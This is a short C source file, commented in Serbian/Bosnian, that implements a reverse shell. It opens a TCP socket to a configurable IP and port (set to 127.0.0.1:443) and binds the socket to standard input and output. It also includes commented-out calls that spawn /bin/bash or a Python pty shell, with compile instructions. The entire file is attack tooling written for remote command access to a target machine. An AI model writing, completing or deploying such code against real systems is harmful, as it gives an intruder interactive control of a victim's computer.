#include<stdio.h> 		// definise osnovne ulazno/izlazne funkcije
#include<sys/socket.h>  // za kreiranje soketa & konektovanje sa istim
#include<netinet/in.h>  // definise sockaddr_in strukturu
#include<unistd.h> 		// za dup2() funkciju
#include <arpa/inet.h>  // za inet_addr() funkciju


// za jednostavno kompajliranje u linux terminal: gcc -o ime-fajla c-shell.c
// tip fajla nakon kompajliranja: ELF 64-bit


// definisanje IP & porta
#define PORT 443
#define IP_ADRESA "127.0.0.1"


int main()
{
	// kreiranje soketa pomocu funkcije socket()
	// kao parametre uzima AF_INET - radi se o IPv4 adresi; SOCK_STREAM - TCP protokol; 0 - ip protokol
	int soket;
	soket = socket(AF_INET, SOCK_STREAM, 0);
	
	
	// koristi se sockaddr_in struktura gdje su definisane promjenjive poput IP adrese i porta
	struct sockaddr_in meta;


	// definisemo IPv4 tip adrese, port, IP adresu
	meta.sin_family = AF_INET;
	meta.sin_port = htons(PORT);
	meta.sin_addr.s_addr = inet_addr(IP_ADRESA);


	// kreiranje konekcije, sintaksa je preuzeta sa connect() manuala, ali malo modifikovana
	// struct sockaddr je pokazatelj na adresu varijable "meta"
	connect(soket, (struct sockaddr *)&meta , sizeof(meta));
	
	//kreiranje duplikata 'soketa', moraju dva - jedan za kreiranje procesa, drugi za stdout na racunar koji prima konekciju
	dup2(soket, 0);
	dup2(soket, 1);
    
	// za python3 shell (bolji nego /bin/bash)
    //system("python3 -c \"import pty;pty.spawn('/bin/bash')\"");

	// za normal shell
    //system("/bin/bash");
}